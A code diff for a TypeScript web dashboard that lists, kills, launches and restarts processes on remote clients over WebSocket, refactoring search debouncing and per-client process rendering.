-            inpSearchProc.style.border = "1px solid var(--neon-cyan)";
-            inpSearchProc.style.boxShadow = "0 0 5px var(--neon-cyan)";
-        } else {
-            btnClearSearch.style.display = "none";
-            inpSearchProc.style.border = "";
-            inpSearchProc.style.boxShadow = "";
-        }
-    }, 300);
-
+    const handleSearch = (() => {
+        let timeout: any;
+        return () => {
+            clearTimeout(timeout);
+            timeout = setTimeout(() => {
+                processSearchTerm = inpSearchProc.value.toLowerCase().trim();
+                if (activeClientId) {
+                    const c = clients.get(activeClientId);
+                    if(c) renderProcessListForClient(c);
+                }
+                // Toggle Clear Button
+                if (processSearchTerm) {
+                    btnClearSearch.style.display = "block";
+                    inpSearchProc.style.border = "1px solid var(--neon-cyan)";
+                    inpSearchProc.style.boxShadow = "0 0 5px var(--neon-cyan)";
+                } else {
+                    btnClearSearch.style.display = "none";
+                    inpSearchProc.style.border = "";
+                    inpSearchProc.style.boxShadow = "";
+                }
+            }, 300);
+        };
+    })();
     inpSearchProc.addEventListener("input", handleSearch);
 
     // Clear Button Logic
     btnClearSearch.onclick = () => {
         inpSearchProc.value = "";
         processSearchTerm = "";
-        renderProcessList();
         btnClearSearch.style.display = "none";
         inpSearchProc.style.border = "";
         inpSearchProc.style.boxShadow = "";
         inpSearchProc.focus();
+        if (activeClientId) {
+             const c = clients.get(activeClientId);
+             if(c) renderProcessListForClient(c);
+        }
     };
 
     // Select All
@@ -736,17 +845,17 @@ function initEvents() {
 
     // Multi-Kill
     btnKill.onclick = () => {
-        if (!activeClientId) return;
-        const checked = document.querySelectorAll(".chk-proc-row:checked");
-        if (checked.length === 0) return alert("No processes selected!");
+         if (!activeClientId) return;
+         const checked = document.querySelectorAll(".chk-proc-row:checked");
+         if (checked.length === 0) return alert("No processes selected!");
 
-        if (confirm(`Kill ${checked.length} selected processes?`)) {
-            checked.forEach((kb: any) => {
-                const pid = kb.getAttribute("data-pid");
-                if (pid) wsClient.sendText(activeClientId!, `kill_process ${pid}`);
-            });
-            setTimeout(() => refreshProcessList(), 1000);
-        }
+         if (confirm(`Kill ${checked.length} selected processes?`)) {
+             checked.forEach((kb: any) => {
+                 const pid = kb.getAttribute("data-pid");
+                 if (pid) wsClient.sendText(activeClientId!, `kill_process ${pid}`);
+             });
+             // No need for setTimeout, the auto-refresh interval will handle it
+         }
     };
 
     // Process List Delegation (Kill Button)
@@ -759,25 +868,17 @@ function initEvents() {
             if (pid && activeClientId) {
                 if (confirm(`Are you sure you want to KILL process ${pid}?`)) {
                     wsClient.sendText(activeClientId, `kill_process ${pid}`);
-                    setTimeout(() => refreshProcessList(), 500);
+                    // No need for setTimeout, the auto-refresh interval will handle it
                 }
             }
         }
     });
 
     // Client Shutdown
-    btnShutdown.onclick = () => {
-        if (activeClientId && confirm(`Are you sure you want to SHUTDOWN Client #${activeClientId}?`)) {
-            wsClient.sendText(activeClientId, "shutdown");
-        }
-    };
+    btnShutdown.onclick = () => { if(activeClientId && confirm(`Are you sure you want to SHUTDOWN Client #${activeClientId}?`)) wsClient.sendText(activeClientId, "shutdown"); };
 
     // Client Restart
-    btnRestart.onclick = () => {
-        if (activeClientId && confirm(`Are you sure you want to RESTART Client #${activeClientId}?`)) {
-            wsClient.sendText(activeClientId, "restart");
-        }
-    };
+    btnRestart.onclick = () => { if(activeClientId && confirm(`Are you sure you want to RESTART Client #${activeClientId}?`)) wsClient.sendText(activeClientId, "restart"); };
 
     // --- New Process & App Features ---
     const inpStartProc = document.getElementById("inp-start-proc") as HTMLInputElement;
@@ -789,7 +890,7 @@ function initEvents() {
     btnStartProcExec.onclick = () => {
         const cmd = inpStartProc.value.trim();
         if(cmd && activeClientId) {
-            wsClient.sendText(activeClientId, `start_process ${cmd}`);
+            wsClient.sendText(activeClientId, `launch_app ${cmd}`); // Fixed to use launch_app
             inpStartProc.value = "";
         }
     };
@@ -881,18 +982,23 @@ function initEvents() {
 
 // Helper to check if app is running
 function getAppPids(app: AppInfo): string[] {
+    // Get processes from active client
+    if (!activeClientId) return [];
+    const client = clients.get(activeClientId);
+    if (!client) return [];
+
     // extract binary name from start cmd
     let binName = app.exec.split(' ')[0].split('/').pop()?.toLowerCase();
     if (!binName) return [];
 
-    return currentProcesses
-        .filter(p => {
+    return client.processes
+        .filter((p: Process) => {
              const pName = p.name.toLowerCase();
              const pCmd = p.cmd.toLowerCase();
              // Match either exact name or substring in cmd
              return pName === binName || pCmd.includes(binName!);
         })
-        .map(p => p.pid);
+        .map((p: Process) => p.pid);
 }
 
 function renderApplications(apps: AppInfo[]) {
